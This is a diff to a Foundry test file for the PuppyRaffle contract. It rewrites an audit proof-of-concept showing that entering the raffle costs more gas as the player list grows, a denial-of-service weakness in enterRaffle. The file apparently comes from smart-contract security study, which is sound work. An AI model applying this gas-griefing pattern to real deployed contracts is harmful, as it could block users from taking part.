@@ -210,34 +210,39 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
-    // POC
-    function test_enterRaffle_DOS() public {
+    // POC `PuppyRafle::enterRaffle` DoS
+    function test_audit_enterRaffle_DenialOfService() public {
         vm.txGasPrice(1);
 
-        address[] memory players = new address[](1);
-        address firstPlayer = addr("firstPlayer");
-        address lastPlayer = addr("lastPlayer");
+        // Create 1st 100 players
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum);
+        for (uint256 i; i < playersNum; i++) {
+            players[i] = address(i + 1);
+        }
 
         // Calculate gas cost of entering raffle for 1st player
         uint256 gasBefore = gasleft();
-        hoax(firstPlayer, 100_000 ether);
-        players[0] = firstPlayer;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
         uint256 gasAfter = gasleft();
+        uint256 gasCostFirst = (gasBefore - gasAfter) * tx.gasprice;
 
-        for (uint256 i; i < 98; i++) {
-            players[0] = address(i + 1);
-            gasBefore = gasleft();
-            hoax(address(i + 1), 100_000 ether);
-            puppyRaffle.enterRaffle{value: entranceFee}(players);
-            gasAfter = gasleft();
+        // Create 2nd 100 players
+        address[] memory players2 = new address[](playersNum);
+        for (uint256 i; i < playersNum; i++) {
+            players2[i] = address(i + 1 + playersNum);
         }
 
-        // Calculate gas cost of entering raffle for 100th player
+        // Calculate gas cost of entering raffle for 2nd player
         gasBefore = gasleft();
-        hoax(lastPlayer, 100_000 ether);
-        players[0] = lastPlayer;
-        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        puppyRaffle.enterRaffle{value: entranceFee * players2.length}(players2);
         gasAfter = gasleft();
+        uint256 gasCostSecond = (gasBefore - gasAfter) * tx.gasprice;
+
+        console2.log(gasCostFirst);
+        console2.log(gasCostSecond);
+
+        // 2nd player should pay more gas than 1st player
+        assertTrue(gasCostSecond > gasCostFirst);
     }
 }
